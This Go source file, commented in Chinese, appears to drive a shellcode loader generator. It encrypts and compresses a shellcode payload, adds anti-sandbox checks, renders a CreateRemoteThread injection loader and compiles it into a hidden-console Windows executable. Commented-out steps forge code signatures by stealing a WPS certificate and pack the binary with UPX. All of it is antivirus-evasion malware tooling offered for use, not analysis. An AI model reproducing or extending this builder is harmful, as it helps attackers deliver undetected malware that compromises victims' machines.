package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/compress"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 反沙箱模块
	sandbox := render.SandBox{
		Methods: []string{
			"sandbox.BootTime",
			"sandbox.GetDesktopFiles",
		}}

	// 压缩算法模块
	compressor := render.Compressor{
		Import:    "variant/compress",
		Algorithm: "compress.LzwDecompress",
		Ratio:     8,
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       rand.LByteStrings(16),
		IV:        rand.LByteStrings(16),
	}
	// 加密之后的 shellcode
	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	payload, _ = compress.LzwCompress([]byte(payload), 8)

	local := render.Local{
		Payload:  payload,
		KeyName:  rand.RStrings(),
		KeyValue: string(params.Key),
		IvName:   rand.RStrings(),
		IvValue:  string(params.IV),
	}

	loader := render.Loader{
		Method: "loader.CreateRemoteThreadHalos",
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText:    rand.RStrings(),
		PlainText:     rand.RStrings(),
		DecryptMethod: "crypto.XorAesHexBase85Decrypt",
		Loader:        loader,
		Local:         local,
		SandBox:       sandbox,
		Compressor:    compressor,
		//Args:          args,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v4/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: true,
		CompilePath: "output",
		BuildMode:   "pie",
		Literals:    true,
		GSeed:       true,
		Tiny:        true,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}

	// 添加图标和文件信息
	//err = cOpts.HandleWinRes()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 伪造证书配置
	//sOpts := build.SignOpts{
	//	SignPath: "output",
	//	UnSign:   cOpts.ExeFileName,
	//	Signed:   fmt.Sprintf("signed_%s", cOpts.ExeFileName),
	//	Cert:     "wps.der",
	//	Thief:    "wps.exe",
	//	DstCert:  "wps.der",
	//}

	// 保存证书
	//err = sOpts.SaveCert()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 利用EXE进行签名伪造
	//err = sOpts.ExeThief()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 利用证书进行签名伪造
	//err = sOpts.CertThief()
	//if err != nil {
	//	log.Fatal(err)
	//}

	// 压缩参数
	//upx := build.UpxOpts{
	//	Level:   "--lzma",
	//	Keep:    true,
	//	Force:   true,
	//	SrcExe:  cOpts.ExeFileName,
	//	SrcPath: "output",
	//	UpxPath: "build",
	//}

	// 执行压缩
	//err = upx.UpxPacker()
	//if err != nil {
	//	log.Fatal(err)
	//}

}
